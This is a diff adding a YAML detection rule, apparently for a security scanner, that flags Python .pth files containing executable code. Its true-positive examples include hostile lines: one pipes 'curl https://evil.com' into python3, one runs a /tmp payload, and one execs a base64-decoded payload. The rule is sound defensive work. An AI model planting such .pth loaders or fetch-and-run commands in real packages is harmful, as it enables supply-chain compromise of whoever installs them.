@@ -1,0 +1,65 @@
+# =============================================================
+# aguara.supply-chain-exfil.pth-file-with-executable-content
+# =============================================================
+# Adapted from SC-EX-004 (https://github.com/garagon/aguara)
+# Apache-2.0 (c) 2026 garagon
+# Source: Aguara
+# Severity: critical  |  ASAMM: AI-03 (+AG-04,AG-03)
+# =============================================================
+external_source:
+  tool: aguara
+  original_id: SC-EX-004
+  original_title: .pth file with executable content
+  source_version: git-d8797926c0d1
+  import_date: '2026-05-03'
+  upstream: https://github.com/garagon/aguara
+  license: Apache-2.0 (c) 2026 garagon
+agent_audit_id: aguara.supply-chain-exfil.pth-file-with-executable-content
+title: .pth file with executable content
+description: Detects .pth files containing dangerous executable Python code such as subprocess calls, exec/eval, or dynamic
+  imports. Skips known-safe ecosystem .pth files.
+severity_default: critical
+category: supply-chain-exfil
+audit_surface:
+- instruction_file
+- skill_md
+- tool_description
+asamm:
+  primary: AI-03
+  secondary:
+  - AG-04
+  - AG-03
+  mapping_confidence: category-default
+  notes: Category-level default at import. Review per rule.
+targets:
+- '*.pth'
+match_mode: any
+patterns:
+- type: regex
+  value: (?i)(subprocess|os\.system|os\.popen|exec\(|eval\(|compile\()
+- type: regex
+  value: (?i)(__import__|importlib)
+- type: regex
+  value: (?i)(open\(|Path\(|read\(\))
+- type: regex
+  value: (?i)import\s+\w+\s*;\s*\w
+exclude_patterns:
+- type: contains
+  value: import _virtualenv
+- type: contains
+  value: import _distutils_hack
+- type: contains
+  value: import coverage
+- type: contains
+  value: import pkg_resources
+remediation: Remove executable code from .pth files. Use proper entry points or setup scripts instead. .pth files should only
+  contain directory paths.
+examples:
+  true_positive:
+  - import subprocess; subprocess.Popen([sys.executable, "/tmp/payload.py"])
+  - import os; os.system("curl https://evil.com | python3")
+  - exec(__import__("base64").b64decode("cGF5bG9hZA=="))
+  false_positive:
+  - /usr/local/lib/python3.12/site-packages
+  - ./vendor/libs
+  - import _virtualenv
